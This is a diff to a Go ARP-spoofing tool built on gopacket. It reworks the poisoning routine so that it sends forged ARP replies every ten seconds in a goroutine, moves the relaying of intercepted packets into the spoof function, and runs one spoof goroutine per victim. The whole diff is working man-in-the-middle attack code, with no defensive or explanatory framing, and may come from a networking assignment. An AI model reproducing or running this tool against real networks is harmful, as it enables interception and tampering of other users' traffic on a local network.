@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"sync"
 	"time"
 
 	"github.com/google/gopacket"
@@ -12,6 +13,8 @@ import (
 )
 
 const BUFSIZ int32 = 512
+
+var wg sync.WaitGroup
 
 var attackerIP net.IP
 var attackerMAC net.HardwareAddr
@@ -102,44 +105,20 @@ func buildRelayPacket() []byte {
 	return buf.Bytes()
 }
 
-// !todo fix posioning logic
 func poison(handle *pcap.Handle, index int) {
-	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-	for packet := range packetSource.Packets() {
-		if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
-			eth, _ := ethLayer.(*layers.Ethernet)
-			if string(eth.SrcMAC) == string(senderMAC) {
-				if eth.EthernetType == layers.EthernetTypeARP {
-					arpLayer := packet.Layer(layers.LayerTypeARP)
-					arp, _ := arpLayer.(*layers.ARP)
-					if arp.Operation == layers.ARPRequest && string(arp.DstProtAddress) == string(targetIPs[index]) {
-						infectionARPReply := buildInfectionARPReply(index)
-						if err := handle.WritePacketData(infectionARPReply); err != nil {
-							panic("Error sending packet to network device")
-						} else {
-							fmt.Printf("[+] Successfully poisoned sender's ARP cache\n")
-						}
-					}
-				} else if eth.EthernetType == layers.EthernetTypeIPv4 {
-					ipLayer := packet.Layer(layers.LayerTypeIPv4)
-					ip, _ := ipLayer.(*layers.IPv4)
-					if string(ip.SrcIP) == string(senderIPs[index]) {
-						relay := buildRelayPacket()
-						if err := handle.WritePacketData(relay); err != nil {
-							panic("Error sending packet to network device")
-						} else {
-							fmt.Printf("[+] Successfully relayed packet to target\n")
-						}
-					}
-				} else {
-					continue
-				}
-			}
+	for {
+		infectionARPReply := buildInfectionARPReply(index)
+		if err := handle.WritePacketData(infectionARPReply); err != nil {
+			panic("Error sending packet to network device")
+		} else {
+			fmt.Printf("[+] Successfully poisoned ARP cache\n")
 		}
+		time.Sleep(time.Second * 10)
 	}
 }
 
 func spoof(handle *pcap.Handle, index int) {
+	defer wg.Done()
 	normalARPRequest := buildNormalARPRequest(senderIPs[index])
 	if err := handle.WritePacketData(normalARPRequest); err != nil {
 		panic("Error sending packet to network device")
@@ -176,7 +155,22 @@ func spoof(handle *pcap.Handle, index int) {
 	fmt.Printf("[+] Successfully got MAC address of %s\n", targetIPs[index])
 	fmt.Printf("targetMAC: %s\n", targetMAC) // !debug
 
-	poison(handle, index)
+	go poison(handle, index)
+
+	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+	for packet := range packetSource.Packets() {
+		if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
+			eth, _ := ethLayer.(*layers.Ethernet)
+			if string(eth.SrcMAC) == string(senderMAC) {
+				relay := buildRelayPacket()
+				if err := handle.WritePacketData(relay); err != nil {
+					panic("Error sending packet to network device")
+				} else {
+					fmt.Printf("[+] Successfully relayed packet to target\n")
+				}
+			}
+		}
+	}
 }
 
 func main() {
@@ -215,9 +209,12 @@ func main() {
 		fmt.Printf("couldn't open device %s\n", intf)
 		panic(err)
 	} else {
-		for i := range len(senderIPs) {
-			// !todo fix concurrency problem using goroutine
-			spoof(handle, i)
+		n := len(senderIPs)
+		wg.Add(n)
+		for i := range n {
+			go spoof(handle, i)
 		}
 	}
+
+	wg.Wait()
 }
